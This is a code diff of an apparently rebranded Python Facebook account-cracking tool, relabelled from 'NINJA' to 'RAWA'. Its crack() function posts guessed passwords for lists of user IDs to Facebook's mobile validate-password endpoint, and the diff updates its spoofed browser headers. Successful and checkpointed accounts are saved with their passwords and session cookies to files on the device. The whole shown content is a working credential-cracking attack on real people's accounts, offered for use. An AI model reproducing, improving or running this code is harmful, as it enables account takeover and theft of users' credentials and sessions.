@@ -220,17 +220,16 @@ def clear():
 def back():
 	login()
 logo=(Colorate.Horizontal(Colors.blue_to_red, """  
- ███▄    █  ██▓ ███▄    █  ▄▄▄██▀▀▀▄▄▄          
-  ██ ▀█   █ ▓██▒ ██ ▀█   █    ▒██  ▒████▄       
- ▓██  ▀█ ██▒▒██▒▓██  ▀█ ██▒   ░██  ▒██  ▀█▄     
- ▓██▒  ▐▌██▒░██░▓██▒  ▐▌██▒▓██▄██▓ ░██▄▄▄▄██    
- ▒██░   ▓██░░██░▒██░   ▓██░ ▓███▒   ▓█   ▓██▒   
- ░ ▒░   ▒ ▒ ░▓  ░ ▒░   ▒ ▒  ▒▓▒▒░   ▒▒   ▓▒█░   
- ░ ░░   ░ ▒░ ▒ ░░ ░░   ░ ▒░ ▒ ░▒░    ▒   ▒▒ ░   
-    ░   ░ ░  ▒ ░   ░   ░ ░  ░ ░ ░    ░   ▒      
-          ░  ░           ░  ░   ░        ░  ░   
-  
- BY : @i4m_ninja🔥             
+    ########:::::'###::::'##:::::'##::::'###::::
+ ##.... ##:::'## ##::: ##:'##: ##:::'## ##:::
+ ##:::: ##::'##:. ##:: ##: ##: ##::'##:. ##::
+ ########::'##:::. ##: ##: ##: ##:'##:::. ##:
+ ##.. ##::: #########: ##: ##: ##: #########:
+ ##::. ##:: ##.... ##: ##: ##: ##: ##.... ##:
+ ##:::. ##: ##:::: ##:. ###. ###:: ##:::: ##:
+..:::::..::..:::::..:::...::...:::..:::::..::
+
+Vesion 1.1💖
  
                                """, 1))
 #--------------------[ BAGIAN-MASUK ]--------------#
@@ -285,14 +284,14 @@ def login_lagi334():
 def menu():
     print(logo)
     print('')
-    print('\x1b[1;37m1. \x1b[1;32mCrack Public')
-    print('\x1b[1;37m2. \x1b[1;32mCrack File')
-    print('\x1b[1;37m3. \x1b[1;32mResult')
-    print('\x1b[1;37m0. \x1b[1;31mCrack Public')
+    #print('\x1b[1;37m1. \x1b[1;32mCrack Public')
+    print('\x1b[1;37m[X,x]. \x1b[1;32m𝐂𝐑𝟒𝐂𝐊 𝐅𝐈𝐋𝐄🏆')
+    #print('\x1b[1;37m3. \x1b[1;32mResult')
+    #print('\x1b[1;37m0. \x1b[1;31mCrack Public')
     ninja=input('\x1b[1;37m . Choose :\x1b[1;32m ')
     if ninja =='1':
         dump_massal()
-    elif ninja =='2':
+    elif ninja =='X':
         crack_file()
     elif ninja =='3':
        result()
@@ -467,7 +466,7 @@ def crack_file():
 
 
     
-	o = input('\x1b[1;96m\x1b[1;37m[+] Enter File :\x1b[1;32m ')
+	o = input('\x1b[1;96m\x1b[1;37m[⚡️] FILE  :\x1b[1;32m ')
 
 	print('')
 
@@ -659,7 +658,7 @@ def passwrd():
 def crack(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
-	sys.stdout.write(f"\r \x1b[1;37m[\x1b[1;32mNINJA\x1b[1;37m] : {loop}×{len(id)} \x1b[1;32m[{ok}] \x1b[1;31m[{cp}]\x1b[1;37m \x1b[1;34m{'{:.0%}'.format(loop/float(len(id)))}  "),
+	sys.stdout.write(f"\r \x1b[1;37m[\x1b[1;32mRAWA~B~Api\x1b[1;37m] : {loop}×{len(id)} \x1b[1;32m[{ok}] \x1b[1;31m[{cp}]\x1b[1;37m \x1b[1;34m{'{:.0%}'.format(loop/float(len(id)))}  "),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -668,16 +667,54 @@ def crack(idf,pwv):
 	ses = requests.Session()
 	for pw in pwv:
 		try:
-			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
+			ses.headers.update({'authority': 'm.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+    'cache-control': 'max-age=0',
+    'dpr': '2.75',
+    'sec-ch-prefers-color-scheme': 'light',
+    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.2"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"Redmi Note 8 Pro"',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"11.0.0"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25',
+    'viewport-width': '980',
+})
 			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=957549474255294&kid_directed_site=0&app_id=957549474255294&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv15.0%2Fdialog%2Foauth%3Fapp_id%3D957549474255294%26cbt%3D1697360168011%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df102586be6d4b4%2526domain%253Dshopee.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fshopee.co.id%25252Ffbd75cfcc8f984%2526relation%253Dopener%26client_id%3D957549474255294%26display%3Dtouch%26domain%3Dshopee.co.id%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fshopee.co.id%252Fbuyer%252Flogin%253Ffrom%253D%25252F%25253Fgclid%25253DCj0KCQjwm66pBhDQARIsALIR2zDm81Puz-4VA_hVp87lneZqPWLcnl0NLxEo0A80KHNGSM_j9WaUocoaAiWCEALw_wcB%2526gclid%253DCj0KCQjwm66pBhDQARIsALIR2zDm81Puz-4VA_hVp87lneZqPWLcnl0NLxEo0A80KHNGSM_j9WaUocoaAiWCEALw_wcB%2526next%253D%25252F%25253Fgclid%25253DCj0KCQjwm66pBhDQARIsALIR2zDm81Puz-4VA_hVp87lneZqPWLcnl0NLxEo0A80KHNGSM_j9WaUocoaAiWCEALw_wcB%26locale%3Den_US%26logger_id%3Df29a23499ee1ff%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df110aa6fab0aef%2526domain%253Dshopee.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fshopee.co.id%25252Ffbd75cfcc8f984%2526relation%253Dopener%2526frame%253Df20a5faf22a268%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv15.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df110aa6fab0aef%26domain%3Dshopee.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fshopee.co.id%252Ffbd75cfcc8f984%26relation%3Dopener%26frame%3Df20a5faf22a268%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
 			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v15.0/dialog/oauth?app_id=957549474255294&cbt=1697360168011&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df102586be6d4b4%26domain%3Dshopee.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fshopee.co.id%252Ffbd75cfcc8f984%26relation%3Dopener&client_id=957549474255294&display=touch&domain=shopee.co.id&e2e=%7B%7D&fallback_redirect_uri=https%3A%2F%2Fshopee.co.id%2Fbuyer%2Flogin%3Ffrom%3D%252F%253Fgclid%253DCj0KCQjwm66pBhDQARIsALIR2zDm81Puz-4VA_hVp87lneZqPWLcnl0NLxEo0A80KHNGSM_j9WaUocoaAiWCEALw_wcB%26gclid%3DCj0KCQjwm66pBhDQARIsALIR2zDm81Puz-4VA_hVp87lneZqPWLcnl0NLxEo0A80KHNGSM_j9WaUocoaAiWCEALw_wcB%26next%3D%252F%253Fgclid%253DCj0KCQjwm66pBhDQARIsALIR2zDm81Puz-4VA_hVp87lneZqPWLcnl0NLxEo0A80KHNGSM_j9WaUocoaAiWCEALw_wcB&locale=en_US&logger_id=f29a23499ee1ff&origin=2&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df110aa6fab0aef%26domain%3Dshopee.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fshopee.co.id%252Ffbd75cfcc8f984%26relation%3Dopener%26frame%3Df20a5faf22a268&response_type=token%2Csigned_request%2Cgraph_domain&scope=public_profile%2Cemail&sdk=joey&version=v15.0&ret=login&fbapp_pres=0&tp=unspecified","flow":"login_no_pin","pass":pw,}
 			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
 			koki+=' m_pixel_ratio=2.625; wd=412x756'
-			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="8", "Chromium";v="111"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=957549474255294&kid_directed_site=0&app_id=957549474255294&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv15.0%2Fdialog%2Foauth%3Fapp_id%3D957549474255294%26cbt%3D1697360168011%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df102586be6d4b4%2526domain%253Dshopee.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fshopee.co.id%25252Ffbd75cfcc8f984%2526relation%253Dopener%26client_id%3D957549474255294%26display%3Dtouch%26domain%3Dshopee.co.id%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fshopee.co.id%252Fbuyer%252Flogin%253Ffrom%253D%25252F%25253Fgclid%25253DCj0KCQjwm66pBhDQARIsALIR2zDm81Puz-4VA_hVp87lneZqPWLcnl0NLxEo0A80KHNGSM_j9WaUocoaAiWCEALw_wcB%2526gclid%253DCj0KCQjwm66pBhDQARIsALIR2zDm81Puz-4VA_hVp87lneZqPWLcnl0NLxEo0A80KHNGSM_j9WaUocoaAiWCEALw_wcB%2526next%253D%25252F%25253Fgclid%25253DCj0KCQjwm66pBhDQARIsALIR2zDm81Puz-4VA_hVp87lneZqPWLcnl0NLxEo0A80KHNGSM_j9WaUocoaAiWCEALw_wcB%26locale%3Den_US%26logger_id%3Df29a23499ee1ff%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df110aa6fab0aef%2526domain%253Dshopee.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fshopee.co.id%25252Ffbd75cfcc8f984%2526relation%253Dopener%2526frame%253Df20a5faf22a268%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv15.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df110aa6fab0aef%26domain%3Dshopee.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fshopee.co.id%252Ffbd75cfcc8f984%26relation%3Dopener%26frame%3Df20a5faf22a268%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
+			heade={'authority': 'm.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+    'cache-control': 'max-age=0',
+    'dpr': '2.75',
+    'sec-ch-prefers-color-scheme': 'light',
+    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.2"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"Redmi Note 8 Pro"',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"11.0.0"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25',
+    'viewport-width': '980',
+}
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				print(f'\r{M}NINJA-CP{M} {K}{idf} {M}{K}{pw} \n {kuki}')     
-				open('/sdcard/NINJA-PAID-CP.txt','a').write(idf+' | '+pw+'\n')
+				print(f'\r{M}RAWA-CP{M} {K}{idf} {M}{K}{pw} \n {kuki}')     
+				open('/sdcard/Rawa-PAID-CP.txt','a').write(idf+' | '+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
 				break
@@ -686,7 +723,7 @@ def crack(idf,pwv):
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				print(f'\r{x}{b}NINJA-OK{H} {idf} {b}{pw} | {asha(idf)}\n{b}{H}{kuki}{N}')
-				open('/sdcard/NINJA-PAID-OK.txt','a').write(idf+' | '+pw+'\n')
+				open('/sdcard/RAWA-PAID-OK.txt','a').write(idf+' | '+pw+'\n')
 				cek_NIK(kuki)
 				break
 				
